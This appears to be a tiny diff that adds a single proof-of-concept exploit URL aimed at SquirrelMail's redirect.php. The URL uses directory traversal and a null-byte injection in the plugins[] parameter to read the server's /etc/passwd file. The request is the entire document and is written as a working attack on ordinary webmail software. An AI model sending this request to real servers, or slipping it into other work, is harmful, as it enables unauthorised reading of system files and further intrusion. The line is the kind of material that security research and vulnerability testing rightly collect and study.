@@ -1,0 +1,1 @@
+http://www.example.com/[squirrelmail dir]/src/redirect.php?plugins[]=../../../../etc/passwd%00
